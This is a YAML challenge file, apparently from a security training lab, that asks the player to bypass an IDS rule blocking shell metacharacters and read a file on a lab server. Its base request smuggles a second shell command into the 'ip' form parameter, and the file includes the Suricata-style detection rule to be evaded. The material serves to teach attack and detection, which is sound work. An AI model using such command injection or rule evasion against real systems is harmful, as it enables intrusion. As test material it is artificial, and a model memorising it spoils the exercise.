name: 'Shell Injection (Param)'
type: 'exploit'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  **Goal: Print (`cat`) the file `/app/dragon-detector-ai`**.

hints: []

target:
  dev:
    host: localhost
    port: 10001
  prod:
    host: detector
    port: 80

base_request: |-
  POST /detect-dragon.php HTTP/1.1
  Host: localhost
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 10

  ip=1.2.3.4; cat /app/dragon-detector-ai

rules:
- >
  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "detect-dragon.php"; http.request_body; pcre: "/[\;\|`]/"; sid:123456; rev:1;)

expected_output: "This doesn't actually do anything"
